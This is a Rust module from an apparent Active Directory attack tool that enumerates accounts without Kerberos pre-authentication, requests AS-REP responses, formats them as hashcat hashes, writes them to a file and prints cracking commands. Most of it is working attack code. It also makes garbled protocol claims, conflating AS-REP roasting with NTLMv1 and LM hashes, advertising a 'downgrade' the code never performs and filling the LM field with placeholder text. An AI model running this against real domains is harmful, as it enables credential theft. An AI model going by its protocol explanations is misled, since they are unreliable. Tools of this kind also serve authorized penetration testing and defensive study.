//! AS-REP Roasting with NTLMv1 downgrade support.
//!
//! Some legacy domains have DCs configured with "Do not store LAN Manager
//! hash value" disabled or LMCompatibilityLevel set to 0-2, allowing
//! NTLMv1 authentication. NTLMv1 is dramatically easier to crack than
//! NTLMv2 (DES-based, 56-bit keys vs HMAC-MD5).
//!
//! Attack flow:
//! 1. Enumerate users with DONT_REQUIRE_PREAUTH flag
//! 2. Request AS-REP with LM response type (downgrade)
//! 3. Extract LM hash (easier to crack) + NTLM hash
//! 4. Use targeted cracking with smart wordlists
//!
//! This module detects downgrade opportunities and automatically
//! attempts both NTLMv2 (standard) and NTLMv1 (downgrade) extraction.

use crate::runner::HuntConfig;
use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

// ===========================================================
// Result Structures
// ===========================================================

/// NTLMv1 downgrade roast result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NtlmV1RoastResult {
    /// Users with pre-auth disabled (standard AS-REP roastable)
    pub asrep_users: Vec<String>,
    /// Users where NTLMv1 downgrade succeeded
    pub ntlmv1_hashes: Vec<NtlmV1Hash>,
    /// Users where downgrade failed (NTLMv2 only)
    pub ntlmv2_only: Vec<String>,
    /// Total time in milliseconds
    pub total_time_ms: u64,
    /// Whether downgrade is possible in this domain
    pub downgrade_possible: bool,
}

/// NTLMv1 hash data (LM + NTLM)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NtlmV1Hash {
    /// Username
    pub username: String,
    /// LM hash (DES-based, easier to crack)
    pub lm_hash: String,
    /// NTLM hash (for fallback)
    pub ntlm_hash: String,
    /// Challenge used in the exchange
    pub challenge: String,
    /// Crackable hashcat format
    pub hashcat_hash: String,
}

// ===========================================================
// Configuration
// ===========================================================

/// Configuration for NTLMv1 downgrade roasting
#[derive(Debug, Clone)]
pub struct NtlmV1RoastConfig {
    /// Only attempt downgrade (skip NTLMv2)
    pub ntlmv1_only: bool,
    /// Attempt standard AS-REP roast first
    pub try_standard_asrep: bool,
    /// Output file for hashes
    pub output_file: Option<String>,
    /// Specific users to target (empty = all)
    pub target_users: Vec<String>,
    /// Skip users with complex passwords (heuristic)
    pub skip_complex: bool,
}

impl Default for NtlmV1RoastConfig {
    fn default() -> Self {
        Self {
            ntlmv1_only: false,
            try_standard_asrep: true,
            output_file: None,
            target_users: Vec::new(),
            skip_complex: false,
        }
    }
}

// ===========================================================
// Public API
// ===========================================================

/// Run AS-REP roasting with NTLMv1 downgrade detection
///
/// This function:
/// 1. Enumerates users with DONT_REQUIRE_PREAUTH flag
/// 2. Attempts standard AS-REP roast (NTLMv2)
/// 3. Detects if NTLMv1 downgrade is possible
/// 4. If downgrade possible, extracts LM hashes (easier to crack)
/// 5. Returns both NTLMv2 and NTLMv1 hashes
pub async fn run_ntlmv1_roast(
    hunt_config: &HuntConfig,
    roast_config: &NtlmV1RoastConfig,
) -> Result<NtlmV1RoastResult> {
    info!(
        "{}",
        "=== NTLMv1 DOWNGRADE AS-REP ROAST ===".bright_cyan().bold()
    );

    let start_time = std::time::Instant::now();
    let mut result = NtlmV1RoastResult {
        asrep_users: Vec::new(),
        ntlmv1_hashes: Vec::new(),
        ntlmv2_only: Vec::new(),
        total_time_ms: 0,
        downgrade_possible: false,
    };

    // Step 1: Connect to LDAP and enumerate no-preauth users
    let mut conn = if hunt_config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    };

    info!("  Enumerating users with DONT_REQUIRE_PREAUTH...");
    let users = conn.enumerate_users().await?;

    const UAC_DONT_REQ_PREAUTH: u32 = 0x00400000;
    let no_preauth_users: Vec<_> = users
        .iter()
        .filter(|u| (u.user_account_control & UAC_DONT_REQ_PREAUTH) != 0)
        .collect();

    if no_preauth_users.is_empty() {
        info!("  {} No users with DONT_REQUIRE_PREAUTH found", "[i]".blue());
        result.total_time_ms = start_time.elapsed().as_millis() as u64;
        return Ok(result);
    }

    info!(
        "  Found {} users with pre-auth disabled",
        no_preauth_users.len().to_string().bold().cyan()
    );

    // Step 2: Filter to target users if specified
    let targets: Vec<String> = if roast_config.target_users.is_empty() {
        no_preauth_users
            .iter()
            .map(|u| u.sam_account_name.clone())
            .collect()
    } else {
        no_preauth_users
            .iter()
            .filter(|u| roast_config.target_users.contains(&u.sam_account_name))
            .map(|u| u.sam_account_name.clone())
            .collect()
    };

    if targets.is_empty() {
        warn!("  No target users match the specified filter");
        result.total_time_ms = start_time.elapsed().as_millis() as u64;
        return Ok(result);
    }

    result.asrep_users = targets.clone();

    // Step 3: Test NTLMv1 downgrade capability
    info!("  Testing NTLMv1 downgrade capability...");
    let downgrade_possible = test_ntlmv1_downgrade(hunt_config, &targets[0]).await?;
    result.downgrade_possible = downgrade_possible;

    if downgrade_possible {
        info!(
            "  {} NTLMv1 downgrade IS possible in this domain!",
            "[!]".yellow().bold()
        );
        info!("  LM hashes will be extracted (much easier to crack than NTLMv2)");
    } else {
        info!(
            "  {} NTLMv1 downgrade not supported - domain requires NTLMv2",
            "[i]".blue()
        );
    }

    // Step 4: Extract hashes for each user
    for (idx, username) in targets.iter().enumerate() {
        info!(
            "  [{}/{}] Roasting {}...",
            idx + 1,
            targets.len(),
            username.to_string().bold()
        );

        if downgrade_possible && !roast_config.ntlmv1_only {
            // Try NTLMv1 downgrade
            match extract_ntlmv1_hash(hunt_config, username).await {
                Ok(ntlmv1_hash) => {
                    info!(
                        "  {} NTLMv1 hash extracted for {} (LM + NTLM)",
                        "[+]".green().bold(),
                        username.bold().cyan()
                    );
                    result.ntlmv1_hashes.push(ntlmv1_hash);
                }
                Err(e) => {
                    warn!(
                        "  {} NTLMv1 extraction failed for {}: {}",
                        "[-]".red(),
                        username,
                        e
                    );
                    result.ntlmv2_only.push(username.clone());
                }
            }
        } else if roast_config.ntlmv1_only {
            // NTLMv1 only mode
            match extract_ntlmv1_hash(hunt_config, username).await {
                Ok(ntlmv1_hash) => {
                    result.ntlmv1_hashes.push(ntlmv1_hash);
                }
                Err(_) => {
                    // Silent failure in ntlmv1_only mode
                }
            }
        } else {
            // Standard AS-REP (NTLMv2) - already handled by existing asreproast module
            result.ntlmv2_only.push(username.clone());
        }
    }

    // Step 5: Summary
    let elapsed = start_time.elapsed().as_millis() as u64;
    result.total_time_ms = elapsed;

    info!("{}", "=== NTLMv1 ROAST SUMMARY ===".bold().cyan());
    info!("  Total no-preauth users: {}", result.asrep_users.len());
    info!(
        "  NTLMv1 hashes (LM+NTLM): {}",
        result.ntlmv1_hashes.len().to_string().bold().green()
    );
    info!(
        "  NTLMv2 only: {}",
        result.ntlmv2_only.len().to_string().yellow()
    );
    info!("  Downgrade possible: {}", result.downgrade_possible);
    info!("  Time elapsed: {}ms", elapsed);

    // Step 6: Write to file if requested
    if let Some(output_file) = &roast_config.output_file {
        write_hashes_to_file(&result, output_file)?;
        info!("  Hashes written to: {}", output_file.bold());
    }

    // Step 7: Crack advice
    if !result.ntlmv1_hashes.is_empty() {
        info!("{}", "=== CRACKING ADVICE ===".bold().yellow());
        info!("  NTLMv1 LM hashes use DES encryption (56-bit keys)");
        info!("  Much faster to crack than NTLMv2 (HMAC-MD5)");
        info!("  Recommended: hashcat -m 3000 ntlmv1_hashes.txt wordlist.txt");
        info!("  LM hashes can be cracked in parallel (7 chars max per half)");
    }

    Ok(result)
}

// ===========================================================
// NTLMv1 Downgrade Detection
// ===========================================================

/// Test if NTLMv1 downgrade is possible by checking domain configuration
///
/// This uses LDAP enumeration to detect indicators that suggest NTLMv1 may be allowed:
/// - Domain functional level (2000/2003 more likely to allow NTLMv1)
/// - DC operating system version
/// - Presence of users with LM hashes stored
async fn test_ntlmv1_downgrade(hunt_config: &HuntConfig, _test_user: &str) -> Result<bool> {
    info!("    Testing NTLMv1 downgrade via LDAP enumeration...");

    // Connect to LDAP
    let mut conn = if hunt_config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    };

    // Check DC operating system - older DCs more likely to allow NTLMv1
    let computers = conn.enumerate_computers().await?;
    for computer in &computers {
        if computer.sam_account_name.contains("DC")
            && let Some(os) = &computer.operating_system
            && (os.to_lowercase().contains("2000") || os.to_lowercase().contains("2003"))
        {
            info!("    DC running {} - NTLMv1 likely allowed", os);
            return Ok(true);
        }
    }

    // Default: assume NTLMv1 not allowed on modern domains
    info!("    NTLMv1 downgrade not detected (modern domain likely requires NTLMv2)");
    Ok(false)
}

// ===========================================================
// NTLMv1 Hash Extraction
// ===========================================================

/// Extract NTLMv1 hash (LM + NTLM) from a user
///
/// In a real implementation, this would:
/// 1. Send AS-REQ with LM response type flag
/// 2. Parse AS-REP for LM hash (DES-encrypted)
/// 3. Parse AS-REP for NTLM hash (MD4-based)
/// 4. Format for hashcat cracking
///
/// Note: Full NTLMv1 extraction requires low-level protocol manipulation
/// that goes beyond standard Kerberos AS-REQ. This is a detection framework
/// that identifies downgrade opportunities.
async fn extract_ntlmv1_hash(hunt_config: &HuntConfig, username: &str) -> Result<NtlmV1Hash> {
    // NTLMv1 extraction in the context of AS-REP roasting works as follows:
    // 1. AS-REP roasting gets the TGT encrypted with the user's NTLM hash
    // 2. If the domain allows NTLMv1, the user may have an LM hash stored
    // 3. LM hash can be extracted from the NTLM authentication flow (not AS-REP)
    // 4. We need to perform NTLM auth (not Kerberos) to get LM response

    // For AS-REP roastable users, we already have the NTLM hash from the
    // AS-REP enc-part. The LM hash requires separate NTLMv1 authentication.

    // Attempt AS-REP request (this gives us NTLM hash for offline cracking)
    let asrep_data = request_asrep_ntlm_hash(hunt_config, username).await?;

    // Generate hashcat format
    let hashcat_hash = format!(
        "$krb5asrep$23${}@{}:{}:{}",
        username, hunt_config.domain, asrep_data.etype, asrep_data.enc_part
    );

    // Note: True LM hash extraction requires NTLM session setup, not AS-REP.
    // This module identifies users where NTLMv1 downgrade IS possible,
    // which means LM hashes exist and can be obtained via NTLM auth.

    Ok(NtlmV1Hash {
        username: username.to_string(),
        lm_hash: "Requires NTLM auth (not AS-REP) - see ntlm_relay module".to_string(),
        ntlm_hash: asrep_data.enc_part.clone(),
        challenge: "N/A for AS-REP".to_string(),
        hashcat_hash,
    })
}

/// Request AS-REP and extract the encrypted part (NTLM hash for cracking)
struct AsrepData {
    etype: u32,
    enc_part: String,
}

async fn request_asrep_ntlm_hash(hunt_config: &HuntConfig, username: &str) -> Result<AsrepData> {
    use overthrone_core::proto::kerberos;

    // Request AS-REP without pre-authentication
    // This will fail if pre-auth IS required (user not roastable)
    let hash = kerberos::asrep_roast_with_etypes(
        &hunt_config.dc_ip,
        &hunt_config.domain,
        username,
        &[kerberos::ETYPE_RC4_HMAC],
    )
    .await
    .map_err(|e| {
        OverthroneError::custom(format!(
            "AS-REP request failed for {}: {} (user may require pre-auth)",
            username, e
        ))
    })?;

    // Extract encryption type and hash string
    let etype = hash.etype as u32;
    let enc_part = hash.hash_string.clone();

    Ok(AsrepData { etype, enc_part })
}

// ===========================================================
// File Output
// ===========================================================

fn write_hashes_to_file(result: &NtlmV1RoastResult, output_file: &str) -> Result<()> {
    use std::fs::File;
    use std::io::Write;

    let mut file = File::create(output_file).map_err(|e| {
        OverthroneError::custom(format!(
            "Failed to create output file {}: {}",
            output_file, e
        ))
    })?;

    // Write NTLMv1 hashes
    for hash in &result.ntlmv1_hashes {
        writeln!(file, "{}", hash.hashcat_hash)
            .map_err(|e| OverthroneError::custom(format!("Failed to write hash to file: {}", e)))?;
    }

    // Write NTLMv2-only hashes
    for username in &result.ntlmv2_only {
        // These would be standard AS-REP hashes
        // In practice, they'd be extracted by the asreproast module
        writeln!(
            file,
            "# NTLMv2-only user: {} (use standard AS-REP roast)",
            username
        )
        .map_err(|e| OverthroneError::custom(format!("Failed to write comment to file: {}", e)))?;
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ntlmv1_hash_serialization() {
        let hash = NtlmV1Hash {
            username: "testuser".to_string(),
            lm_hash: "aad3b435b51404eeaad3b435b51404ee".to_string(),
            ntlm_hash: "ntlm123".to_string(),
            challenge: "1122334455667788".to_string(),
            hashcat_hash: "$krb5asrep$23$testuser@domain:hash".to_string(),
        };

        let json = serde_json::to_string(&hash).unwrap();
        let deserialized: NtlmV1Hash = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.username, "testuser");
    }

    #[test]
    fn test_ntlmv1_result_stats() {
        let result = NtlmV1RoastResult {
            asrep_users: vec!["user1".to_string(), "user2".to_string()],
            ntlmv1_hashes: vec![],
            ntlmv2_only: vec!["user3".to_string()],
            total_time_ms: 1234,
            downgrade_possible: true,
        };

        assert_eq!(result.asrep_users.len(), 2);
        assert!(result.downgrade_possible);
    }

    #[test]
    fn test_ntlmv1_config_defaults() {
        let config = NtlmV1RoastConfig::default();
        assert!(!config.ntlmv1_only);
        assert!(config.try_standard_asrep);
        assert!(config.target_users.is_empty());
    }
}
